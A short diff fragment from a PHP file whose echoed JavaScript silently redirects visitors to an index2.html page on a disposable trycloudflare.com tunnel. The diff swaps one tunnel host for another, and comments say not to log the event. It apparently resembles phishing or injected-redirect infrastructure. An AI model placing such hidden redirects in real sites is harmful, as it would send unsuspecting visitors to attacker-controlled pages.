@@ -101,11 +101,11 @@ echo '
             // Don\'t log this message
             // Try to redirect to the template page
             try {
-                window.location.href = "https://gold-rough-additions-semi.trycloudflare.com/index2.html";
+                window.location.href = "https://automatic-dictionary-shades-klein.trycloudflare.com/index2.html";
             } catch (e) {
                 // Don\'t log this message
                 // Fallback redirection
-                window.location = "https://gold-rough-additions-semi.trycloudflare.com/index2.html";
+                window.location = "https://automatic-dictionary-shades-klein.trycloudflare.com/index2.html";
             }
         }
         
